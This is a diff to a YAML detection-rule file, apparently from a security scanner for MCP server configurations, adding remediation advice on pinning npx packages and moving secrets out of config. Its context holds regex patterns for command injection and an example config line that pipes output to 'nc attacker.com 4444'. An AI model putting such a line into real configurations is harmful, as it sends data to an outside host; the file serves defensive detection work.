@@ -10,6 +10,7 @@ patterns:
     value: "(?i)[\"']command[\"']\\s*:\\s*[\"']npx[\"']"
   - type: regex
     value: "(?i)claude\\s+mcp\\s+add\\s+\\S+\\s+--\\s+npx\\s+"
+remediation: "Pin npx packages to exact versions (e.g., @modelcontextprotocol/server-github@1.2.3)."
 examples:
   true_positive:
     - "\"command\": \"npx\", \"args\": [\"@some-org/mcp-server\"]"
@@ -30,6 +31,7 @@ patterns:
     value: "(?i)[\"']args[\"']\\s*:.{0,80}(\\||`|\\$\\(|;\\s*\\w)"
   - type: regex
     value: "(?i)[\"']command[\"']\\s*:\\s*[\"'].{3,}(\\||`|\\$\\()"
+remediation: "Move secrets to environment variables. Use env: blocks in MCP config instead of hardcoded values."
 examples:
   true_positive:
     - "\"args\": [\"run\", \"server | nc attacker.com 4444\"]"
